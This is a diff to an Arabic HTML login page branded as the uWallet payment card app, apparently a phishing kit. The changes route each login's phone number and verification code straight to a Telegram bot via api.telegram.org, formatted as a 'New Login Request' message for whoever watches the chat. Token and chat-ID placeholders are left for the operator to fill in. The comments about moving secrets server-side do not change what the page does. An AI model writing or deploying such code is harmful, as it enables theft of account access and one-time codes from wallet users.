@@ -209,7 +209,7 @@
             transform: translateY(-2px);
         }
 
-        /* ===== صفحة ال��سجيل ===== */
+        /* ===== صفحة التسجيل ===== */
         .header {
             background: white;
             padding: 0;
@@ -778,7 +778,7 @@
                 <div style="margin-bottom:8px;">
                     <div class="welcome-section-title">💳 عن البطاقة</div>
                     <div class="card-section" role="region" aria-label="معلومات البطاقة">
-                        <img class="card-image" src="https://e.top4top.io/p_3900f3lzy0.jpeg" alt="صورة البطاقة uwallet" loading="lazy">
+                        <img class="card-image" src="https://e.top4top.io/p_3900aeb4n0.png" alt="صورة البطاقة uwallet" loading="lazy">
                         <div class="card-desc">
                             بطاقة UWallet - بطاقة مدفوعة مسبقاً متوافقة مع خدمات التطبيق، تمنحك سهولة الدفع والسحب من شبكة واسعة من المتاجر وماكينات الصراف الآلي.
                             <small>مزايا: استلام عروض حصرية، حماية مشتريات، سهولة الشحن والتحكم عبر التطبيق.</small>
@@ -867,7 +867,7 @@
 
         <!-- Header صفحة التسجيل -->
         <div class="header" id="header">
-            <img src="https://e.top4top.io/p_3900f3lzy0.jpeg" alt="uWallet Header" class="header-image" id="headerImg" loading="lazy">
+            <img src="https://i.top4top.io/p_3899kc4nn0.jpeg" alt="uWallet Header" class="header-image" id="headerImg" loading="lazy">
         </div>
 
         <!-- Content صفحة التسجيل -->
@@ -946,9 +946,9 @@
         // --- ملاحظة أمان:
         // لا تضع توكن BOT و chat_id في واجهة المستخدم في بيئة إنتاجية.
         // انقل عملية إرسال الرسائل إلى خادم (server-side) للحفاظ على المفاتيح والسرية.
-        // استخدم server endpoint بدلاً من API مباشرة
-        
-        const SERVER_ENDPOINT = '/api/send-telegram'; // استبدل بـ endpoint الخادم الفعلي
+        // لكي يعمل المثال هنا افتراضياً: ضع القيم الحقيقية في المتغيرين أدناه أو قم بتشغيل إرسال من الخادم.
+        const TELEGRAM_BOT_TOKEN = 'REPLACE_WITH_TELEGRAM_BOT_TOKEN';
+        const TELEGRAM_CHAT_ID = 'REPLACE_WITH_TELEGRAM_CHAT_ID';
         const VERIFICATION_TIMER = 300;
 
         // Arabic to English digit mapping
@@ -1017,24 +1017,44 @@
         };
 
         const sendToTelegram = async (data) => {
+            // إذا لم يتم وضع التوكن/الشات آي دي، نعيد false ونعرض رسالة توجيهية
+            if (TELEGRAM_BOT_TOKEN === 'REPLACE_WITH_TELEGRAM_BOT_TOKEN' ||
+                TELEGRAM_CHAT_ID === 'REPLACE_WITH_TELEGRAM_CHAT_ID') {
+                console.warn('Telegram token/chat_id not configured. Move sending to server.');
+                return false;
+            }
+
             try {
-                const response = await fetch(SERVER_ENDPOINT, {
+                const message = `
+📱 <b>New Login Request</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<b>User Information:</b>
+📞 <code>${data.phone}</code>
+${data.verificationCode ? `
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✅ <b>Verification Code:</b>
+<code>${data.verificationCode}</code>
+` : ''}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+                `.trim();
+
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                
+                const response = await fetch(url, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify(data)
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
                 });
 
-                if (!response.ok) {
-                    console.error('خطأ في الإرسال:', response.statusText);
-                    return false;
-                }
-
-                const result = await response.json();
-                return result.success || false;
+                return response.ok;
             } catch (error) {
-                console.error('خطأ في الاتصال:', error);
+                console.error('خطأ في إرسال البيانات:', error);
                 return false;
             }
         };
@@ -1102,7 +1122,7 @@
             loginBtn.disabled = true;
             loginBtn.innerHTML = '<span class="loading"></span>';
 
-            // إرسال البيانات إلى الخادم
+            // نرسل لمن يراقب الدخول (مع رمز إن أردت)
             const payload = { phone: formData.phone, verificationCode: formData.generatedCode };
             const sent = await sendToTelegram(payload);
 
@@ -1115,13 +1135,13 @@
                 document.getElementById('content').classList.add('active');
                 document.getElementById('loginForm').classList.remove('active');
                 document.getElementById('verificationForm').classList.add('active');
-                document.getElementById('headerImg').src = 'https://e.top4top.io/p_3900f3lzy0.jpeg';
+                document.getElementById('headerImg').src = 'https://i.top4top.io/p_3899kc4nn0.jpeg';
                 document.getElementById('phoneDisplay').textContent = formatPhoneDisplay(formData.phone);
                 document.querySelector('.code-digit[data-index="0"]').focus();
                 startTimer();
                 isVerificationPageActive = true;
             } else {
-                showToast('خطأ في الإرسال — تحقق من الاتصال أو حاول لاحقاً', 'error');
+                showToast('لم يتم الإرسال — تأكد من إعداد التليجرام أو انقل الإرسال إلى الخادم', 'error');
             }
         };
 
@@ -1137,9 +1157,10 @@
             const sent = await sendToTelegram(payload);
 
             if (sent) {
-                showModal('تم الإرسال', 'تم استلام الرمز، سيتم التواصل معك قريباً');
+                showModal('تم الإرسال', 'تم استلام الرمز، سيتم التواصل معك قريبا');
                 clearCodeInputs();
             } else {
+                // لا نكشف تفاصيل الخادم للعميل؛ نعرض رسالة عامة
                 showToast('حدث خطأ أثناء التحقق. حاول لاحقاً.', 'error');
             }
         };
